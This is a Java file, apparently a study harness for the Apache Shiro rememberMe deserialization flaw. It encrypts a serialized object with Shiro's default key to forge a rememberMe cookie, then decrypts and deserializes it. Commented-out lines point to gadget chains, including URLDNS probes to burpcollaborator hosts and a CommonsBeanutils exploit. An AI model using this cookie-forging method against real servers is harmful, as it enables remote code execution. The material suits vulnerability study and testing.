package shiro;

import beans.User;
import expUtils.ExpUtils;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.mgt.AbstractRememberMeManager;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.web.mgt.CookieRememberMeManager;

import javax.management.BadAttributeValueExpException;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.PriorityQueue;

public class Decrypt {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
//
//        PriorityQueue

//        User user = new User();
//        user.setAge(18);
//        user.setName("xxfB");

//        PayloadUtils.getCommonBeanExp()
//        ExpUtils.getURLDNSChains("http://c8l76f8p9qm9xno5aue84mr5vw1ppe.burpcollaborator.net")

//        HashMap hashMap =  ExpUtils.getURLDNSChains("http://n4swhvolqvi359z9yoofrl1q0h67uw.burpcollaborator.net");
//        Object obj2 =  ExpUtils.getCommonBeanExp();
        Object[] obj2 = new Object[]{new String("123"),new String("456")};
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(byteArrayOutputStream);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(bufferedOutputStream);
//        写入恶意累
        objectOutputStream.writeObject(obj2);
        objectOutputStream.close();
        byte[] payload = byteArrayOutputStream.toByteArray();
        System.out.println(payload.length);
        System.out.println("===============================");
        AbstractRememberMeManager abstractRememberMeManager = new CookieRememberMeManager();

        AesCipherService aesCipherService = new AesCipherService();
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        // 加密
        ByteSource byteSource = aesCipherService.encrypt(payload,Base64.decode(key));
        String cipherSelf = Base64.encodeToString(byteSource.getBytes());
        System.out.println("rememberMe: " + cipherSelf);


        // 解密
//        String cipher = "VPvGfrsiVYaOdcxcpsmFI0bY2g7ehAcyXJRAfG2Ihaz1o2gr2OupJHZxMmRDg89WHiz54GLrkjOZU+9zwQiL3TtqPYtmh0TyQjsRJTbWj93m31G+/aLPu/l1Rj24ZhcHQTliotQdOnRvrZODb1XScxxEfBmtNc6/9E8CGXGJZALDzysLMoBWnIpcHA/5gXoZ3wlG6zL8WeBAh/TFe67zhIQefVe+7khm/klbHMbPrHQjPLZpioXVsSUfPkSLk+duwKGrt6th9Km9Z1roAE7j0l6BMXm4Sd8mYJquixcWM5Vu+diXxYReoOwLLV/E3cZsalFGI/EUtxDe+CHhJRLL41TKhuaE5cSNRIBoBS09Q2/cw2xMNCZfcj9RIryNcNITzZnRJQ/9/T3fhfw8ozzGs8XX82i9GV4kf5XVzTyrWFW6rWOC6QoC5SsCjvvonYuplBxb/D75SJJ9Cx8shEyZ0WAvjf8tTubByuG3XE5NCMFQ2XNROcIj5k/Ts2j0pbeA";


        ByteSource plain_text = aesCipherService.decrypt(Base64.decode(cipherSelf),Base64.decode(key));
        System.out.println("解密后对象二进制" + Base64.encodeToString(plain_text.getBytes()));
        payload = plain_text.getBytes();




        Object obj = abstractRememberMeManager.getSerializer().deserialize(payload);
        SimplePrincipalCollection set = (SimplePrincipalCollection) obj;
        String a="1";
        System.out.println(obj);
    }
}
